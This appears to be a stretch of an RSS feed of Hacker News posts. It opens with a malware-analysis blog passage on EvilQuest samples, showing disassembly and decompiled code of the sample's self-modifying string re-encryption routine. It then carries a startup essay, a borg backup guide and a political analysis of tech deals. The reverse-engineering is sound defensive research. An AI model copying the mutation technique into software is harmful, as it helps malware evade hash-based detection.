September 19, 2020 | https://reverse.put.as/2020/09/17/evilquest-revisited/ | <a href="https://web.archive.org/web/*/https://reverse.put.as/2020/09/17/evilquest-revisited/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <div>
    <div>
      <article role="main">
        <p>No. I just clickbaited you but don’t leave yet, keep reading for something fun!</p>
<p>A couple of days ago I found something curious on <a href="https://www.virustotal.com/gui/">VirusTotal</a>. There were more than 40 thousand binaries with the same size in a single day. That seemed very odd so I loaded two random binaries and compared their contents. The only difference was on strings section.</p>
<p>VirusTotal detections were very low (two to three) and identified the samples as EvilQuest/ThiefQuest malware.</p>
<p>To prove that all the binaries were the same except for strings, I wrote a quick <a href="https://github.com/gdbinit/evilquest_stats">Mach-O stats</a> utility in <a href="https://golang.org/">Go</a> (yes, 2020 is this crazy!) to hash the code and strings sections separately. The hypothesis is that the code section would have the same hash for all the samples, and the strings section would have a unique hash for each sample. The output confirmed that this was indeed the case - same code, different strings.</p>
<p>Running this program against 206091 binaries totalling 34GB of data:</p>
<div><pre><code data-lang="bash">Mach-O Stats
<span>(</span>c<span>)</span> <span>2020</span> Pedro Vilaca. All Rights Reserved
 100% |███████████████████████████████████████| <span>(</span>206091/206091, <span>1563</span> it/s<span>)</span> <span>[</span>2m11s:0s<span>]</span>
__text map
cd87dfd659fc2334ccc59093c1f41ba9abf4c88046d438ddd8bc2d82f55859d7 <span>206091</span>
</code></pre></div><p>Given that the strings are encrypted/obfuscated, my first idea was that this could be a new version with mutated versions being used in different sources. Doesn’t make that much sense given that the code was the same but given that EvilQuest has ransomware features, this could be for example different BitCoin wallets for each sample.</p>
<p>Now it was time to load one of the samples into a disassembler and give a look at its contents. Assuming that the VirusTotal detections were correct even if too low, I grabbed the <a href="https://objective-see.com/downloads/malware/EvilOSX.zip">known sample</a> of EvilQuest. This sample contains debugging symbols so it’s very easy to navigate since most function names are explicit about their intents. The new sample fixed that mistake and had that information removed.</p>
<p>Before bringing the heavy diffing guns such as <a href="https://www.zynamics.com/software.html">BinDiff</a> and <a href="http://diaphora.re/">Diaphora</a> I like to give a look around to feel what’s going on. In this case the code had differences but was very similar. I could see what were clearly obfuscated/encrypted strings like in the original sample. So, I tried to find those functions using the symbols from the first sample. That was fast and easy and confirmed that the code was related (either from the same author or someone reusing it - attribution is hard :P).</p>
<p>Scott Knight released a <a href="https://github.com/carbonblack/tau-tools/tree/master/malware_specific/ThiefQuest">script</a> to decrypt/encrypt the original samples strings, but it doesn’t work with the new samples. It makes sense given that there are keys and tables that could have changed, and also what appears to be a new type of obfuscated/encrypted string format.</p>
<div><pre><code data-lang="plaintext">000Bg{0000090nQ4XL1qPsnl1ZjpKX0lkFoa0000053
</code></pre></div><p>The new strings type appears to always starts with <strong>000Bg{</strong>.</p>
<p>Learning a new programming language is easier when you have things to do with it, so I decided to write a <a href="https://github.com/gdbinit/evilquest_deobfuscator">decrypter/deobfuscator</a> in Go. In hindsight it wasn’t a smart decision because it’s kind of ugly to deal with buffers in Go and much easier in C (or I don’t know yet the best way to do it in Go).</p>
<div><pre><code data-lang="bash">$ ./evilquest_deobfuscator -s <span>"000Bg{0000090nQ4XL1qPsnl1ZjpKX0lkFoa0000053"</span>
EvilQuest String Deobfuscator
<span>(</span>c<span>)</span> <span>2020</span> Pedro Vilaca. All Rights Reserved
000Bg<span>{</span>0000090nQ4XL1qPsnl1ZjpKX0lkFoa0000053 -&gt; rb+
</code></pre></div><p>Meanwhile, the next day there were again more than 40 thousand new samples with the same size. Confirmed again that the only difference was in strings. While reversing and writing the strings decrypter I noticed that the hash of the sample I was using was modified. That generated a brain click and I went to bed thinking that this wasn’t a big malware campaign (very sad!) because it didn’t make sense with so many samples but it could be a VirusTotal issue. VirusTotal sandbox just got trapped into an analysis loop. This idea was reinforced by the fact that the sample had been submitted from the <strong>ZZ</strong> country code, meaning unknown origin. Connecting these two ideas reinforced my belief that this was the right path.</p>
<p>After I finished the <a href="https://github.com/gdbinit/evilquest_deobfuscator">strings decrypter</a> I could verify that my unique samples campaign hypothesis wasn’t valid. The strings were all the same, just encrypted/obfuscated with different keys.</p>
<p>So, the next step was to verify the code to see what was happening there. This was very easy to find since it’s the first thing the sample does.</p>
<p>At the entrypoint we can observe the mutation function being called first with <code>argv[0]</code> as its argument.</p>
<div><pre><code data-lang="plaintext">000000010001A8D0         public start
000000010001A8D0 start   proc near
(...)
000000010001A8D0         push    rbp
000000010001A8D1         mov     rbp, rsp
000000010001A8D4         sub     rsp, 2F0h
000000010001A8DB         mov     rax, cs:___stack_chk_guard_ptr
000000010001A8E2         mov     rax, [rax]
000000010001A8E5         mov     [rbp+var_8], rax
000000010001A8E9         mov     [rbp+var_94], 0
000000010001A8F3         mov     [rbp+var_98], edi
000000010001A8F9         mov     [rbp+var_A0], rsi
000000010001A900         mov     rax, [rbp+var_A0]
000000010001A907         mov     rdi, [rax]      ; argv[0]
000000010001A90A         call    fg_open_and_reencrypt_cstrings ; binary self modifies here
(...)
</code></pre></div><p>Next follows opening the executable itself with <code>rb+</code> mode (reading and writing). Fun enough there is a memory leak because the decrypted string buffer is malloc’ed in the decryptor function. One of the differences from this sample versus the previous is the increased usage of dynamically allocated memory, increasing the potential for memory leaks. There are a lot more memory leaks all over the code. Xcode Instruments has a nice leak detector (<em>hint, hint</em>).</p>
<div><pre><code data-lang="plaintext">000000010001A840 fg_open_and_reencrypt_cstrings proc near
000000010001A840                                         ; CODE XREF: start+3A↓p
000000010001A840
000000010001A840 var_24          = dword ptr -24h
000000010001A840 __filename      = qword ptr -20h
000000010001A840 FILE_pointer    = qword ptr -18h
000000010001A840 var_10          = qword ptr -10h
000000010001A840 var_4           = dword ptr -4
000000010001A840
000000010001A840         push    rbp
000000010001A841         mov     rbp, rsp
000000010001A844         sub     rsp, 30h
000000010001A848         mov     [rbp+var_10], rdi
000000010001A84C         mov     rdi, [rbp+var_10]
000000010001A850         lea     rax, a000bg0000090nq_18 ; "000Bg{0000090nQ4XL1qPsnl1ZjpKX0lkFoa000"...
000000010001A857         mov     [rbp+__filename], rdi
000000010001A85B         mov     rdi, rax
000000010001A85E         call    fg_decrypt_0000Bg_string ; decrypt/decode string
000000010001A863         mov     rdi, [rbp+__filename]
000000010001A867         mov     rsi, rax  ; "rb+"
000000010001A867                           ; memleak here since the returned ptr was calloc'ed
000000010001A86A         call    _fopen
000000010001A86F         mov     [rbp+FILE_pointer], rax
000000010001A873         cmp     [rbp+FILE_pointer], 0
000000010001A878         jz      loc_10001A890
000000010001A87E         mov     rdi, [rbp+FILE_pointer] ; FILE *
000000010001A882         call    _ftrylockfile
000000010001A887         cmp     eax, 0
000000010001A88A         jz      loc_10001A89C
000000010001A890
000000010001A890 loc_10001A890:            ; CODE XREF: fg_open_and_reencrypt_cstrings+38↑j
000000010001A890         mov     [rbp+var_4], 0FFFFFFFFh
000000010001A897         jmp     loc_10001A8C1
000000010001A89C ; ---------------------------------------------------------------------------
000000010001A89C
000000010001A89C loc_10001A89C:            ; CODE XREF: fg_open_and_reencrypt_cstrings+4A↑j
000000010001A89C         mov     rdi, [rbp+FILE_pointer] ; FILE* handle
000000010001A8A0         call    fg_reencrypt_cstrings
000000010001A8A5         mov     rdi, [rbp+FILE_pointer] ; FILE *
000000010001A8A9         call    _funlockfile
000000010001A8AE         mov     rdi, [rbp+FILE_pointer] ; FILE *
000000010001A8B2         call    _fclose
000000010001A8B7         mov     [rbp+var_4], 0
000000010001A8BE         mov     [rbp+var_24], eax
000000010001A8C1
000000010001A8C1 loc_10001A8C1:            ; CODE XREF: fg_open_and_reencrypt_cstrings+57↑j
000000010001A8C1         mov     eax, [rbp+var_4]
000000010001A8C4         add     rsp, 30h
000000010001A8C8         pop     rbp
000000010001A8C9         retn
000000010001A8C9 fg_open_and_reencrypt_cstrings endp
</code></pre></div><p>The <code>fg_reencrypt_cstrings</code> function is previous listing is where the mutation occurs.
The function will find the <code>__cstring</code> section and iterate over its contents, decrypting and encrypting the strings, and write back to the binary. The original binary is already modified when it returns from <code>fg_open_and_reencrypt_cstrings</code> .</p>
<div><pre><code data-lang="c">(...)
<span>for</span> ( j <span>=</span> <span>0</span>; j <span>&lt;</span> sg<span>-&gt;</span>nsects; <span>++</span>j ) {
    v12 <span>=</span> (<span>__int64</span>)sub_100006580(a1, v17, <span>80LL</span>);
    <span>// obfuscated string is "__cstring"
</span><span></span>    v2 <span>=</span> fg_decrypt_0000Bg_string(<span>"000Bg{00000H0nQ4XL1qPsnl3oBkir1CDCUq3Z{iy|22B2MZ0000073"</span>);
    <span>if</span> ( <span>!</span>strcmp((<span>const</span> <span>char</span> <span>*</span>)v12, v2) ) {
        v11 <span>=</span> (<span>__int64</span>)sub_100006580(a1, <span>*</span>(<span>unsigned</span> <span>int</span> <span>*</span>)(v12 <span>+</span> <span>48</span>), <span>*</span>(_QWORD <span>*</span>)(v12 <span>+</span> <span>40</span>));
        v10 <span>=</span> <span>0LL</span>;
        v9 <span>=</span> <span>0LL</span>;
        v8 <span>=</span> <span>0</span>;
        fseek(a1, <span>*</span>(<span>unsigned</span> <span>int</span> <span>*</span>)(v12 <span>+</span> <span>48</span>), <span>0</span>);
        <span>while</span> ( (<span>unsigned</span> <span>__int64</span>)v8 <span>&lt;</span> <span>*</span>(_QWORD <span>*</span>)(v12 <span>+</span> <span>40</span>) ) {
            <span>if</span> ( <span>*</span>(_BYTE <span>*</span>)(v11 <span>+</span> v8) ) {
                <span>++</span>v9;
            }
            <span>else</span> <span>if</span> ( v9 ) {
                v7 <span>=</span> (<span>char</span> <span>*</span>)calloc(<span>1uLL</span>, v9 <span>+</span> <span>1</span>);
                __memcpy_chk(v7, v10 <span>+</span> v11, v9, <span>-</span><span>1LL</span>);
                v6 <span>=</span> fg_decrypt_0000Bg_string(v7);
                __s <span>=</span> (<span>char</span> <span>*</span>)fg_encrypt_0000Bg_string(v6);
                <span>if</span> ( v7 <span>!=</span> v6 ) {
                    v3 <span>=</span> strlen(__s);
                    <span>if</span> ( v3 <span>==</span> strlen(v7) ) {
                        fseek(a1, v10 <span>+</span> <span>*</span>(<span>unsigned</span> <span>int</span> <span>*</span>)(v12 <span>+</span> <span>48</span>), <span>0</span>);
                        fwrite(__s, <span>1uLL</span>, v9, a1);
                        free(v6);
                    }
                }
                free(v7);
                free(__s);
                v10 <span>+=</span> v9 <span>+</span> <span>1</span>;
                v9 <span>=</span> <span>0LL</span>;
            }
            <span>else</span> {
           …</code></pre></div></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://reverse.put.as/2020/09/17/evilquest-revisited/">https://reverse.put.as/2020/09/17/evilquest-revisited/</a></em></p>]]>
            </description>
            <link>https://reverse.put.as/2020/09/17/evilquest-revisited/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24532184</guid>
            <pubDate>Sun, 20 Sep 2020 06:02:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Startups are a complex multivariable equation]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24531852">thread link</a>) | @grwthckrmstr
<br/>
September 19, 2020 | https://www.preetamnath.com/blog/startups-multivariable-equation | <a href="https://web.archive.org/web/*/https://www.preetamnath.com/blog/startups-multivariable-equation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Launching a startup and building it into a successful business requires a multidisciplinary skillset. Because startups are a complex <a href="https://en.wikipedia.org/wiki/Multivariable_calculus" target="_blank">multivariable equation</a>.</p><p>You have moving target, which is somewhat in sight but not really. You’re wearing glasses but objects at a great distance are blurry.&nbsp;</p><p>The multivariable equation looks something like this</p><ul role="list"><li>understanding the market and finding a gap</li><li>coming up with a product thesis to solve the customer’s needs</li><li>finding the right distribution channels that are profitable</li><li>discovering pockets of places to find the initial set of customers</li><li>positioning the solution with the right messaging</li><li>creating the right business model and pricing structure</li><li>building competitive differentiation to fight off competition</li><li>having a founding team that has the right skillset for all the problems listed above and the million others that aren’t</li></ul><figure id="w-node-2bc32fdcbb34-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f66be2bf4382616b86f3dba_startup%20complex%20multivariable%20equation%20photo.jpg" loading="lazy" alt=""></p><figcaption><em>Photo by </em><a href="https://unsplash.com/@barkiple?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank"><em>John Barkiple</em></a></figcaption></figure><p>There’s a million reasons a startup might fail. And you cannot control those million factors of chaos.</p><p>But you can piece together parts of this equation (via discovery) and solve them one by one. Solving a piece of the equation reduces your chances of crash and burn, i.e. increases your chances of success.</p><p>The factors I’ve listed above are some of the more well understood parts of this equation, and ones that you can actually control and influence.</p><p>However, it doesn’t matter if you get only solve a few parts of the equation, because one or two wrong answers such as distribution channels or business model might be enough to kill your business. That’s what runway (frugality, burn rate, funding, customer revenue) is for.</p><p>Even if you get all the above factors right, it takes a lot of time and effort for your business to take off, to build up momentum and achieve <a href="https://www.preetamnath.com/blog/momentum-escape-velocity" target="_blank">escape velocity</a>.</p><p>It boils down to - Can you solve your startup's multivariable equation before you run out of runway?</p><figure id="w-node-c061837fdebd-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5f66c1f176b8944f5e9c79f3_startup%20runway.jpg" loading="lazy" alt=""></p><figcaption><em>Photo by </em><a href="https://unsplash.com/@jmoncasi?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank"><em>Jordi Moncasi</em></a><a href="https://unsplash.com/?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText"></a></figcaption></figure><p>This is why a lot of successful businesses don’t do something entirely new and from the ground up. They take something existing and working and improve parts of the equation. </p><p>Zoom took WebEx and made the product delightfully easy to use.</p><p>And similarly, a lot of businesses are copycats. They copy something existing and improve upon it slightly and meaningfully. One can argue that <a href="https://invertedpassion.com/copying-ideas-is-highly-underrated/" target="_blank">copying ideas</a> is highly underrated. </p><p>Instagram Stories is basically Snapchat’s innovation, but they won because the distribution piece of the equation was far ahead.</p><p>Zoom and Instagram simply picked a multivariable equation where some of the unknowns were already solved for.</p></div></div>]]>
            </description>
            <link>https://www.preetamnath.com/blog/startups-multivariable-equation</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531852</guid>
            <pubDate>Sun, 20 Sep 2020 04:15:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Backing up data like the adult I supposedly am]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24531670">thread link</a>) | @signa11
<br/>
September 19, 2020 | https://magnusson.io/post/backups/ | <a href="https://web.archive.org/web/*/https://magnusson.io/post/backups/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
      <div>
        

<article>
  <header>
  
  
  <time datetime="2020-09-18T10:47:47+02:00">
    18 September, 2020
  </time>
  
</header>

  <p>Like so many things I’m supposed to do but don’t — getting exercise, eating right, sleeping well, standing up for women and minorities in public spaces — backing up my data has always been something I’ve half-assed at best.</p>
<p>I’ve lugged around an external hard drive with a few hundred gigabytes of data for the last 10 years, and made backups to it once every three or four years or so. Every time I’ve tried restoring anything from those backups I’ve regretted it, because of course I just bought the drive, plugged it in and copied stuff to it, so it is a FAT32 drive while I have mostly had EXT4 filesystems, which means all my file permissions get lost during the process.</p>
<p>I’ve written shameful little shell scripts to set file permissions to 0644 and directory permissions to 0755, recursively, many many times.</p>
<p>Part of my problem was that I both know just enough rsync to be dangerous and have a credit card so I can provision cloud VMs, so forever just around the corner was my perfect backup solution that I’d write myself and maintain and actually do instead of dealing with whatever I had going on in my life. I’ve come to accept that this will never happen, or perhaps more definitively, that I’d rather cut myself than write and maintain another piece of ad-hoc software for myself.</p>
<p>Luckily I recently found two things that have solved this whole problem for me: <a href="https://borgbackup.readthedocs.io/en/stable/">borg</a> and <a href="https://www.rsync.net/">rsync.net</a>.</p>
<p>Borg is backup software. It compresses and deduplicates data at the block level, and strongly encourages (but does not force) you to encrypt data before backing it up. It is everything I’d want from my half-assed rsync and shell script abomination.</p>
<p>I read its documentation a couple of times and was impressed. I then set about comparing different VM hosts to see which one would give me the cheapest block storage option, when the result of some <a href="https://github.com/scotte/borgsnap">random google search</a> led me to rsync.net. They are a company that stores backups, pretty cheaply, and <a href="http://www.rsync.net/products/attic.html">even more cheaply</a> if you use borg to take them. I guess they just really love borg and want us to love it too.</p>
<p>I signed up for their cheapest plan, which starts at 100GB stored for $18 per year. They have no network in- or egress costs, and the storage amount can be adjusted at any time. Once my account had been activated, I did a little password reset dance, and uploaded a public SSH key.</p>
<p>I wanted to back up my <code>$HOME</code> directory, so after installing borg I ran:</p>
<div>
<div>
<pre>export BORG_REMOTE_PATH="borg1"
borg init --encryption repokey-blake2 UID@ch-s011.rsync.net:home</pre>
</div>
</div>
<p>This created a remote borg repository called "home" on rsync.net’s servers. The environment variable is so we use a more recent version of borg on the remote server (version 1.1.11 at the time of writing), as the default version is rather old (version 0.29.0).</p>
<p>When choosing what encryption method to use, one can choose between a "repokey" or a "keyfile". They both create a private key locked with a passphrase; the difference is that with "repokey" the key is stored in the borg repo, while with "keyfile" it is stored outside of it. This boils down to whether we think a passphrase is enough security for our data, or whether we think having a secret keyfile is necessary. I figured my password manager could create a strong enough passphrase for my needs, and I didn’t want to think about losing the keyfile, so I chose "repokey-blake2".</p>
<p>To create my first backup, I ran</p>
<div>
<div>
<pre>borg create --exclude "$HOME/.cache" UID@ch-s011.rsync.net:home::backup-1 "$HOME"</pre>
</div>
</div>
<p>which created the archive "backup-1" in my "home" borg repository. I didn’t change the compression algorithm from the default one.</p>
<p>By default borg compresses data with lz4. It can use other compression methods (xz, zlib, zstd). I compared their compression ratios on some binary files I had and found no difference between them. I think this is because the large binary files I have are mostly audio and video files in lossy formats, which don’t seem to benefit very much from further compression. I have a lot of text files as well, but text takes up so little relative space on today’s hardware that it makes no sense to spend CPU cycles on compressing it better than lz4 does.</p>
<p>This backup command hummed along for a good while, and through a couple of reboot cycles. Doing a second backup right after it finished (or the day after) took a lot less time because of the deduplication:</p>
<div>
<div>
<pre>borg create --exclude "$HOME/.cache" UID@ch-s011.rsync.net:home::backup-2 "$HOME"</pre>
</div>
</div>
<p>Restoring from backup is also easy:</p>
<div>
<div>
<pre>borg extract UID@ch-s011.rsync.net:home::backup-2</pre>
</div>
</div>
<p>I set this up to run as a daily timed systemd service at noon (very easy on NixOS, which every Linux user should be using unless they hate themselves), and will never, ever think about this again. For a handful of bucks a year, that is a good deal.</p>

  







  



</article>


      </div>
    </div>
  </div></div>]]>
            </description>
            <link>https://magnusson.io/post/backups/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531670</guid>
            <pubDate>Sun, 20 Sep 2020 03:16:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Era of Regulatory Grift: TikTok-Oracle, NXP-Qualcomm, Arm-Nvidia]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24531657">thread link</a>) | @ceohockey60
<br/>
September 19, 2020 | https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/ | <a href="https://web.archive.org/web/*/https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="english-version">
                        <p>The dictionary definition of the word “grift” is as follows: “<a href="https://www.merriam-webster.com/dictionary/grift">to acquire money or property illicitly</a>”. It may be a strong word, but also more or less encapsulates the regulatory ethos that’s governing cross-border technology businesses these days.</p><p>The TikTok-Oracle deal flaunts this grifting ethos, but it’s just the latest example of a series of haphazard regulatory actions mired in geopolitical brinkmanship -- a trend that may implicate deals with much larger impact, like the pending Nvidia acquisition of Arm.</p><h2 id="tiktok-oracle">TikTok-Oracle</h2><p>There are still many missing details to the TikTok-Oracle deal, and Trump <a href="https://uk.reuters.com/article/us-usa-tiktok-oracle/trump-raises-questions-about-tiktok-oracle-deal-if-bytedance-ties-remain-idUKKBN2672KD">may not approve the deal</a>. But in the grand scheme of things, many of these details are no longer important, because the spirit of the entire TikTok “soap opera” is cemented: a <strong>regulatory grift </strong>by the Trump administration that enriches its political donor (Larry Ellison), strengthens its campaign message (anti-China, job creation), while doing next to nothing to protect Americans from either intrusive data collection or foreign influence.</p><p>Let’s look at each of these malfeasances.</p><p><strong><em>What Oracle gets.</em></strong> TikTok’s immediate business value accrues to Oracle Cloud to the tune of possibly <a href="https://www.theinformation.com/articles/with-tiktok-deal-oracle-could-gain-billion-dollar-cloud-customer?utm_content=article-4850&amp;utm_campaign=article_email&amp;utm_source=sg&amp;utm_medium=email">$1 billion in annual revenue</a> in the coming years, as it desperately tries to catch up to AWS and Azure. The Oracle brand may also get a boost from this young, cool consumer product, even though Oracle has no experience running such a product. Since I’ve written in detail about TikTok’s business value in “<a href="https://interconnected.blog/what-is-tiktok-worth-to-whom-and-why/"><strong>What is TikTok Worth to Whom and Why?</strong></a>”, I won’t repeat myself here. <strong>One element I did not discuss so explicitly is how valuable TikTok’s user data is to the Oracle data broker business.</strong></p><p>In a nutshell, a data broker sells data to third parties mostly for marketing or advertisement purposes. Oracle’s data broker businesses are euphemistically called <a href="https://www.oracle.com/cx/marketing/">Oracle CX Marketing</a> and <a href="https://www.oracle.com/data-cloud/">Oracle Data Cloud</a>. Having the treasure trove of data that TikTok has already collected is perhaps an even more immediate business boost to Oracle than getting the product’s workload onto its cloud. Ironically (or perhaps appropriately), the person who called out the privacy violations of data brokers like Oracle, Equifax, and others is <a href="https://www.linkedin.com/in/michael-beckerman-9b750a58/"><strong>Michael Berkerman</strong></a><strong>, who is currently TikTok US’s Head of Public Policy</strong>. He did so last year as the then President and CEO of the Internet Association in <a href="https://www.foxnews.com/opinion/michael-beckerman-why-do-we-need-a-federal-privacy-law-ask-the-data-brokers-selling-your-private-information">an OpEd published on Fox News</a> -- a “media” outlet that the President of the United States most certainly pays attention to. I wonder how long Berkerman will be sticking around, if at all, after the TikTok-Oracle deal closes.</p><p>Lastly, Oracle will likely get a <a href="https://www.ft.com/content/58eb7c26-2154-477f-af19-19157ae29261">minority stake in TikTok</a> with ByteDance still being the majority shareholder. This piece of equity in one of the most valuable private tech companies in the world -- trading at a $140 billion valuation in the secondary market earlier this year -- is something that Oracle would have no business getting in a normal investing situation. Not a bad deal <a href="https://www.businessinsider.com/oracle-billionaire-larry-ellison-is-fundraising-for-donald-trump-2020-2">for hosting a single fundraiser</a>.</p><p><strong><em>What the Trump campaign gets.</em> </strong>Being more “anti-China” than Biden and going after the Vice President’s son’s business dealings in China has been a messaging tentpole of the Trump re-election campaign. It can now claim credit for acting tough and forcing a marquee Chinese tech company to “surrender” its crown jewel product to America, while accomplishing none of those things, because TikTok’s core technology is staying with ByteDance in China.</p><p>The Oracle bid also apparently includes a “<strong>20,000 new jobs” </strong>commitment -- a typical public relations promise with no legally binding effect. Being “anti”-China while “creating” jobs is a strong one-two punch as we approach the final stretch of the 2020 election season, so much so that Secretary Mnuchin couldn't wait to sell the 20,000 jobs message on CNBC the day after Oracle’s winning bid was made public, <em>even though</em> the deal hasn’t been approved or finalized yet.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/ZPRPswu2Cyc?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>TikTok US’s current payroll is about 1,400 people. <strong>That would be an almost 20x increase in headcount.</strong> Theoretically possible? Sure. Practical and sensible? Hardly.</p><p><em><strong>What the American people get.</strong> </em>Nothing, except that they still get to watch cool dance videos and <a href="https://www.tiktok.com/@rosssmith/video/6797540353730743557">grandmas do this</a> on their phones. We have no new information or answer to any of the three legitimate concerns surrounding TikTok:</p><ul><li>Does it send data to China?</li><li>Is its user data collection practices proper?</li><li>Is it being used as a tool for foreign influence?</li></ul><p>To be clear, there <em>are</em> regulatory tools based on technology at our disposal to answer these questions, <strong>with or without Oracle</strong>. I’ve laid them out in detail in “<a href="https://interconnected.blog/a-framework-to-dis-trust-and-verify-tiktok/"><strong>A Framework to (Dis)trust and Verify TikTok</strong></a>”. Unfortunately, it’s clear as day that the Trump administration is only interested in the political messaging benefits of TikTok-Oracle, not doing the actual work that is required to protect the interests of the American people.</p><p><strong>There is another winner that we should all take note of: <em>Chinese regulators.</em></strong></p><p>Chinese regulators typically use their power to force technology and IP transfers from foreign entities to domestic companies via joint-ventures or outright acquisitions -- <strong>another form of regulatory grift</strong>. This TikTok-Oracle deal is the first time to my knowledge, where Chinese regulators use their power to protect a home-grown technology from being <em>transferred out</em> to a foreign entity.</p><p>This win has just as much to do with exerting their regulatory power as the sucker on the other side of the negotiation table. This dynamic isn’t new, if we look at the failed NXP-Qualcomm acquisition in 2018.</p><h2 id="nxp-qualcomm">NXP-Qualcomm</h2><p>Qualcomm’s attempt to buy the Dutch semiconductor maker, NXP, for $44 billion was abandoned, because it could not get approval from Chinese regulators. This occurred during the previous height of tension when the U.S. and China were tossing retaliatory trade tariffs at each other like a couple of teenage boys in a backyard snowball fight.</p><p>The Chinese regulators did not disapprove of the deal and asked for changes to gain approval, which would’ve been a good faith move. <strong>They just ignored it and let the deadline pass.</strong> This is after Secretary Mnuchin and his Commerce Department counterpart, Wilbur Ross, lobbied the Chinese Vice Minister, Liu He, and Ambassador to the US, Cui Tiankai, to approve the deal. The backdrop of this lobbying was Trump easing the penalties on the Chinese telecom equipment maker, ZTE, for violating U.S. sanction rules with regard to Iran and North Korea -- hoping for some reciprocity and dealmaking.</p><p>This foolish hope did not pan out. Instead, Qualcomm, America’s national champion in the race to 5G, had to fork up a <a href="https://www.wsj.com/articles/qualcomm-plans-to-abandon-nxp-deal-1532549728">$2 billion cancellation fee to NXP and increase its stock buyback program from $10 to $30 billion</a> to appease its shareholders. What’s more, this turn of events showed Chinese regulators that given the <strong>interconnected nature of the global economy</strong>, particularly technology businesses, they have far-reaching authority and leverage to shape deals, events, and technology acquisition vis-a-vis <strong>a tough-talking, weak-acting </strong>Trump administration. It is a key reversal in fortune, when a large swath of China’s technology sector, particularly Huawei, has been hammered by U.S. sanctions.</p><p>Qualcomm-NXP was a defensive play -- not approving a deal. TikTok-Oracle is a proactive play -- not losing control of domestic technology. <strong>There’s now an opportunity for even more aggressive “regulatory grift”: Arm-Nvidia.</strong></p><h2 id="arm-nvidia">Arm-Nvidia</h2><p>It’s hard to comprehend the long-term impact that Nvidia’s $40 billion acquisition of Arm will have on the future of technology. One thing is certain though: it’s way more important than TikTok and Oracle, separately and combined.</p><p>We shouldn’t assume the Arm-Nvidia deal will be closed as expected given all the corporate governance issues with Arm’s China operation. Arm China’s CEO, Allen Wu, has been fired by the board for various acts of conflicts of interest and double dealing, <a href="https://www.zdnet.com/article/arms-fired-china-jv-head-refuses-to-leave-company-reps-banned-from-company-premises/">yet refuses to leave</a>. Arm’s CEO, Simon Segars, is trying to assure the public that the mess <a href="https://www.yicaiglobal.com/news/chip-designer-arm-to-solve-chinese-jv-management-issue-before-nvidia-buyout">will be cleaned up </a>in order to not endanger the sale, but he’s not in a position of leverage, now that the deal is public and the expectations are high. (Nvidia’s market cap increased by $17.5 billion the day after the deal was announced.)</p><p>Furthermore, the Arm China division is a joint-venture where 51% of the entity is owned by a consortium of these three funds:</p><ul><li><a href="https://en.wikipedia.org/wiki/China_Investment_Corporation">China Investment Corporation</a> (China’s sovereign wealth fund)</li><li><a href="https://en.wikipedia.org/wiki/Silk_Road_Fund">Silk Road Fund</a> (a state-owned fund focused on projects related to the Belt &amp; Road Initiative)</li><li><a href="https://en.wikipedia.org/wiki/Temasek_Holdings">Temasek Holding</a> (Singapore’s sovereign wealth fund)</li></ul><p>The other 49% is owned by Softbank via Arm. The joint venture structure is par for the course for any foreign technology company doing business in China. But such a tight ownership by state-owned funds means Chinese regulators (and Singaporean regulators for that matter) have strong jurisdictional power over the deal from the get-go. NXP-Qualcomm’s legal hook was a tenuous nexus. TikTok-Oracle’s hook was established by <a href="https://en.pingwest.com/a/7657">an eleventh hour change</a> to the government’s technology “entity list”. Arm-Nvidia doesn’t need any extra work for regulators to aggressively insert themselves into the picture.</p><p>What will the Chinese regulators do is hard to tell at this moment. However, given the fact that Arm’s chip design IP has a 95% global market share in mobile devices and is <a href="https://www.zdnet.com/article/aws-graviton2-what-it-means-for-arm-in-the-data-center-cloud-enterprise-aws/">making inroads into cloud data centers</a> as well, <strong>it’s likely that China will either veto the deal (like NXP-Qualcomm) or try to keep any semiconductor IP that Arm China has even a tangential connection to</strong>. Some Chinese tech media <a href="https://mp.weixin.qq.com/s/W8nhj6udDTdr54ui7_0RIQ">are already speculating about a veto</a>. Using this opportunity to acquire some key technology also makes sense, because by <em>not</em> doing so, China runs the monumental risk of having the entire Arm ecosystem be subject to U.S. sanctions after it becomes a property of Nvidia. An “<strong>Arm sanction</strong>” would cripple China’s entire mobile technology sector, where domestic chip design options barely exist and the open source option, RISC-V, still …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/">https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/</a></em></p>]]>
            </description>
            <link>https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531657</guid>
